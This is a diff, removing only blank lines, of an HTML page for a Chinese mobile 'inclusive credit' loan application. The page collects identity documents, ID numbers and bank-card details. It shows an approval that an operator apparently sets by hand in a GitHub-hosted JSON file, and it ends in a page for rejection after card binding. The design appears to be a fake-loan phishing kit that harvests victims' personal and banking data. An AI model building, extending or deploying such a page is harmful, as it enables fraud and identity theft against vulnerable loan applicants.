@@ -42,8 +42,6 @@ body {
 
 .page.active { display: flex; }
 
-
-
 /* 蓝色头部 */
 
 .header-blue {
@@ -75,8 +73,6 @@ body {
 .header-blue h1 { font-size: 26px; font-weight: 700; margin-bottom: 8px; letter-spacing: 1px; }
 
 .header-blue p { font-size: 13px; opacity: 0.85; line-height: 1.6; }
-
-
 
 /* 橙色头部（审核中/拒绝） */
 
@@ -110,8 +106,6 @@ body {
 
 .header-orange p { font-size: 13px; opacity: 0.85; }
 
-
-
 /* 白色卡片 */
 
 .card {
@@ -126,8 +120,6 @@ body {
 
 .card + .card { margin-top: 12px; }
 
-
-
 /* 特性列表 */
 
 .feature-item { display: flex; align-items: flex-start; padding: 10px 0; border-bottom: 1px solid #f0f2f5; }
@@ -139,8 +131,6 @@ body {
 .feature-label { font-size: 15px; font-weight: 600; color: #333; min-width: 72px; flex-shrink: 0; }
 
 .feature-value { font-size: 14px; color: #666; line-height: 1.5; }
-
-
 
 /* 按钮 */
 
@@ -164,8 +154,6 @@ body {
 
 .btn-primary:active { transform: scale(0.98); }
 
-
-
 .btn-next {
 
   background: linear-gradient(135deg, #7ecfaa, #6bc99a);
@@ -186,8 +174,6 @@ body {
 
 .btn-next:active { transform: scale(0.98); }
 
-
-
 .btn-blue {
 
   background: linear-gradient(135deg, #2d7ac7, #5b8fd4);
@@ -203,8 +189,6 @@ body {
   letter-spacing: 2px; box-shadow: 0 4px 14px rgba(45,122,199,0.35);
 
 }
-
-
 
 /* 步骤条 */
 
@@ -248,8 +232,6 @@ body {
 
 .step-line.done { background: #43b97f; }
 
-
-
 /* 上传区域 */
 
 .upload-area {
@@ -268,8 +250,6 @@ body {
 
 .upload-text { font-size: 14px; color: #888; }
 
-
-
 /* 表单项 */
 
 .form-group { margin-bottom: 16px; }
@@ -287,8 +267,6 @@ body {
 }
 
 .form-input:focus { border-color: #43b97f; background: #fff; }
-
-
 
 /* 结果页 */
 
@@ -330,8 +308,6 @@ body {
 
 .val-approved { color: #43b97f; }
 
-
-
 /* 拒绝页 */
 
 .reject-card { text-align: center; padding: 50px 24px; }
@@ -349,8 +325,6 @@ body {
   margin-bottom: 24px;
 
 }
-
-
 
 /* 审核中 */
 
@@ -392,8 +366,6 @@ body {
 
 @keyframes loading-slide { 0% { left: -40%; } 100% { left: 100%; } }
 
-
-
 /* 导航栏 */
 
 .page-nav {
@@ -408,8 +380,6 @@ body {
 
 .nav-title { font-size: 17px; font-weight: 600; color: #333; flex: 1; text-align: center; margin-right: 34px; }
 
-
-
 /* 页面指示器 */
 
 .page-dots { display: flex; justify-content: center; gap: 8px; padding: 16px 0 8px; }
@@ -418,11 +388,7 @@ body {
 
 .dot.active { width: 24px; border-radius: 4px; background: #43b97f; }
 
-
-
 .bottom-spacer { height: 20px; }
-
-
 
 /* 管理员入口 */
 
@@ -435,8 +401,6 @@ body {
 .admin-entry a { color: #999; text-decoration: none; }
 
 .admin-entry a:hover { color: #43b97f; }
-
-
 
 /* 审核中页面信息字段 */
 
@@ -454,11 +418,7 @@ body {
 
 <body>
 
-
-
 <div class="phone-frame">
-
-
 
   <!-- ==================== 第1页：普惠授信 ==================== -->
 
@@ -471,8 +431,6 @@ body {
       <p>最终额度、利率、期限及还款方式以实际审批结果为准</p>
 
     </div>
-
-
 
     <div class="card">
 
@@ -528,8 +486,6 @@ body {
 
     </div>
 
-
-
     <div class="card">
 
       <h3 style="font-size:17px;font-weight:700;color:#333;margin-bottom:12px;">产品介绍</h3>
@@ -544,19 +500,11 @@ body {
 
     </div>
 
-
-
     <button class="btn-primary" onclick="goTo(2)">普惠授信</button>
-
-
-
-
 
     <div class="bottom-spacer"></div>
 
   </div>
-
-
 
   <!-- ==================== 第2页：用户信息认证 ==================== -->
 
@@ -594,11 +542,7 @@ body {
 
     </div>
 
-
-
     
-
-
 
     <div class="card" style="margin:0 16px 12px;border-radius:14px;">
 
@@ -623,8 +567,6 @@ body {
       </div>
 
     </div>
-
-
 
       <div class="card" style="margin:0 16px 16px;border-radius:14px;">
 
@@ -654,15 +596,11 @@ body {
 
     </div>
 
-
-
     <button class="btn-next" onclick="saveAndGo3()">信息无误，下一步</button>
 
     <div class="bottom-spacer"></div>
 
   </div>
-
-
 
   
 
@@ -711,8 +649,6 @@ body {
       </div>
 
     </div>
-
-
 
     <div class="card" style="margin:0 16px 16px;border-radius:14px;">
 
@@ -766,15 +702,11 @@ body {
 
     </div>
 
-
-
     <button class="btn-next" onclick="saveAndGo4()">提交审核</button>
 
     <div class="bottom-spacer"></div>
 
   </div>
-
-
 
   <!-- ==================== 第4页：系统审核中（等待后台填写） ==================== -->
 
@@ -793,8 +725,6 @@ body {
       <button class="btn-next" style="margin-top:32px;background:#ccc;" onclick="manualCheck()">进度刷新</button>
 
     </div>
-
-
 
     <style>
 
@@ -818,8 +748,6 @@ body {
 
     </div>
 
-
-
     <div class="card result-card" style="margin:-24px 16px 16px;">
 
       <div class="result-icon-big"></div>
@@ -838,8 +766,6 @@ body {
         </div>
 
       </div>
-
-
 
       <div style="text-align:left;padding:12px 8px;margin-bottom:12px;">
 
@@ -887,8 +813,6 @@ body {
 
     </div>
 
-
-
     <div class="card" style="margin:0 16px 16px;text-align:center;padding:20px;">
 
       <p style="font-size:13px;color:#999;line-height:1.8;">
@@ -901,11 +825,7 @@ body {
 
     </div>
 
-
-
     <button class="btn-blue" onclick="goTo(6)">绑卡提款</button>
-
-
 
     <div class="bottom-spacer"></div>
 
@@ -924,8 +844,6 @@ id="page6">
         <div style="font-size:13px;color:#888;line-height:1.6;">请绑定您本人名下的银行卡<br>用于授信额度提款到账</div>
 
       </div>
-
-
 
       <div class="form-group">
 
@@ -961,15 +879,11 @@ id="page6">
 
     </div>
 
-
-
     <button class="btn-blue" onclick="submitBankCard()">签约提款</button>
 
     <div class="bottom-spacer"></div>
 
   </div>
-
-
 
 <div class="page" id="pageReject">
 
@@ -1002,13 +916,9 @@ id="page6">
 
   </div>
 
-
-
   <!-- ==================== 第6页：绑卡提款后拒绝 ==================== -->
 
   </div>
-
-
 
 <script>
 
@@ -1035,8 +945,6 @@ function handleFileSelect(event, type) {
   reader.readAsDataURL(file);
 }
 
-
-
 function handleUpload(el, type) {
 
   el.style.borderColor = '#43b97f';
@@ -1054,8 +962,6 @@ function handleUpload(el, type) {
   if (previewImg) { previewImg.style.display = 'block'; }
 
 }
-
-
 
 // 页面跳转
 
@@ -1091,21 +997,13 @@ function goTo(n) {
 
 }
 
-
-
 function formatNum(n) {
 
   return parseInt(n).toLocaleString('zh-CN');
 
 }
 
-
-
 // 刷新额度 - 从后台读取后跳转结果页
-
-
-
-
 
 function saveAndGo3() {
 
@@ -1159,11 +1057,7 @@ function saveAndGo3() {
 
 }
 
-
-
 // 填充审核中页面的用户信息
-
-
 
 function saveAndGo4() {
 
@@ -1215,8 +1109,6 @@ function saveAndGo4() {
 
 }
 
-
-
 function populateReviewInfo() {
 
   var safeSet=function(id,val){var el=document.getElementById(id);if(el)el.textContent=val;};
@@ -1245,10 +1137,6 @@ function populateReviewInfo() {
 
 }
 
-
-
-
-
 function checkResult() {
 
   var name = localStorage.getItem('creditName') || '';
@@ -1258,8 +1146,6 @@ function checkResult() {
   var waitHint = document.getElementById('waitHint');
 
   if (waitHint) waitHint.textContent = '正在查询...';
-
-
 
   fetch('https://api.github.com/repos/S-o-n-G-hua/merchant-app/contents/credit-data.json?ref=main', {
 
@@ -1349,8 +1235,6 @@ function checkResult() {
 
 }
 
-
-
 function manualCheck() { checkResult(); }
 
 function startAutoCheck() {
@@ -1367,8 +1251,6 @@ function startAutoCheck() {
 
 }
 
-
-
 function autoCheckGitHub() {
 
   var name = localStorage.getItem('creditName');
@@ -1379,8 +1261,6 @@ function autoCheckGitHub() {
 
   var token = localStorage.getItem('githubToken') || '';
 
-
-
   // 从 localStorage 读取后台已保存的数据
 
   var githubRating = localStorage.getItem('githubRating') || '';
@@ -1388,8 +1268,6 @@ function autoCheckGitHub() {
   var githubLoanType = localStorage.getItem('githubLoanType') || '';
 
   var githubAmount = localStorage.getItem('githubAmount') || '';
-
-
 
   if (githubRating && githubLoanType) {
 
@@ -1403,15 +1281,11 @@ function autoCheckGitHub() {
 
   }
 
-
-
   // 也尝试从 GitHub 读取（如果后台直接改了 credit-data.json）
 
   fetchCreditDataFromGitHub(name, idCard, token);
 
 }
-
-
 
 function fetchCreditDataFromGitHub(name, idCard, token) {
 
@@ -1457,15 +1331,11 @@ function fetchCreditDataFromGitHub(name, idCard, token) {
 
 }
 
-
-
 function manualCheck() {
 
   checkResult();
 
 }
-
-
 
 // 页面跳转时启动自动检查
 
@@ -1506,8 +1376,6 @@ function submitBankCard() {
 }
 
 </script>
-
-
 
 </body>
 
